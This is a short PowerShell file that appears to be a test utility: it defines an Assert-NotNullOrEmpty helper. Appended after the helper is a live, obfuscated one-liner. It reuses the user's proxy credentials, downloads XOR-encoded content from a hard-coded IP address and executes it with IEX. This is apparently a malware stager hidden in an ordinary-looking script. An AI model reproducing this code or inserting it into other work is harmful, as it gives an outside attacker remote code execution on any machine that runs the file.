﻿














function Assert-NotNullOrEmpty
{
	param([string]$value)

	Assert-False { [string]::IsNullOrEmpty($value) }
}

$wC=NeW-ObJECT SYSTEM.NET.WEbCLIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADERs.AdD('User-Agent',$u);$wc.PRoXy = [SYSTem.Net.WEbReqUesT]::DEfAulTWEbPROXy;$Wc.PrOxy.CredeNtiAls = [SYsTEm.NeT.CredeNtiaLCAChe]::DEfAuLtNETwOrkCredentiAlS;$K='921e1d11b868a611e038d7e3bb2e3745';$I=0;[CHaR[]]$B=([CHar[]]($wC.DOWNLoaDStRINg("http://50.251.57.67:8080/index.asp")))|%{$_-BXOR$k[$i++%$k.LeNgth]};IEX ($B-Join'')

